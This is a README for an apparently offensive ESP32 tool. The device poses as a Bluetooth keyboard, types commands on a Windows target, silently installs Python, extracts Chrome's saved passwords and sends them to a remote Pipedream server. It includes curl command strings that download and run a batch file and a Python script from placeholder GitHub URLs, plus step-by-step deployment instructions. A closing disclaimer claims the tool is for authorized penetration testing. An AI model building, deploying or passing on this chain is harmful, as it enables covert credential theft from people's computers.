# ESP32-WROOM Chrome Password Extractor

This project uses an **ESP32-WROOM** to extract saved passwords from Google Chrome on Windows and send the data to a **Pipedream server** via Wi-Fi or Bluetooth. The ESP32 acts as a **USB Rubber Ducky** using the **BleKeyboard** library to automate keystrokes and execute scripts on the target machine.

---

## Features
- **Automated Payload Execution**: ESP32 injects keystrokes to open CMD and execute scripts.
- **Silent Python Installation**: Installs Python and required dependencies automatically.
- **Data Extraction**: Retrieves saved Chrome passwords.
- **Data Transmission**: Sends extracted data to a remote server.
- **Bluetooth HID Emulation**: Uses ESP32 as a Bluetooth keyboard.

---

## Prerequisites
- **ESP32-WROOM**
- **Arduino IDE** with ESP32 Board Package
- **BleKeyboard Library**
- **Pipedream account** (for receiving data)

---

## Setting Up the ESP32

### 1. Install the Required Libraries
Download and install the **BleKeyboard** library in the Arduino IDE:

1. Open **Arduino IDE**.
2. Go to **Sketch > Include Library > Manage Libraries**.
3. Search for **BleKeyboard** and install it.

### 2. Fix Errors in BleKeyboard Library
After installing **BleKeyboard**, you need to modify two lines of code to fix errors:

#### **Fix 1 (Line 106)**
Find this line:
```
BLEDevice::init(deviceName);
```
Replace it with:
```
BLEDevice::init(String(deviceName.c_str()));
```

#### **Fix 2 (Line 117)**
Find this line:
```
hid->manufacturer()->setValue(deviceManufacturer);
```
Replace it with:
```
hid->manufacturer()->setValue(String(deviceManufacturer.c_str()));
```

---

## Hosting `install_python.bat` and `web.py`

### **1. Upload to GitHub**
To make `install_python.bat` and `web.py` available for download, upload them to a GitHub repository:

1. Create a **GitHub repository**.
2. Upload `install_python.bat` and `web.py` to the repository.
3. Copy the **raw file URLs** (e.g., `https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/YOUR_REPO/main/install_python.bat`).

### **2. Modifying the ESP32 Code**
Update the ESP32 payload script to download and execute the batch file:

```
String batchCommand = "curl -L -o %TEMP%\\install_python.bat https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/YOUR_REPO/main/install_python.bat && start /wait %TEMP%\\install_python.bat";
```

Similarly, update the script for `web.py`:

```
String curlCommand = "curl -L -o %TEMP%\\web.py https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/YOUR_REPO/main/web.py";
```

---

## Flashing the ESP32

1. Open the **Arduino IDE**.
2. Select **ESP32-WROOM** as the board.
3. Open the script and modify the **batch file URLs** to point to your GitHub.
4. Connect the ESP32 and upload the script.

---

## Running the Payload

1. **Connect the ESP32** to the target system.
2. **Wait for Bluetooth to connect**.
3. The ESP32 will automatically inject keystrokes to download and execute the scripts.
4. The extracted passwords will be sent to your **Pipedream server**.

---

## Disclaimer
This project is intended for **ethical hacking and penetration testing** purposes only. Unauthorized access to systems and data is illegal. Ensure you have **explicit permission** before running this tool.

---

## Credits
Developed by **Dhanjith Satheesan** for cybersecurity research.

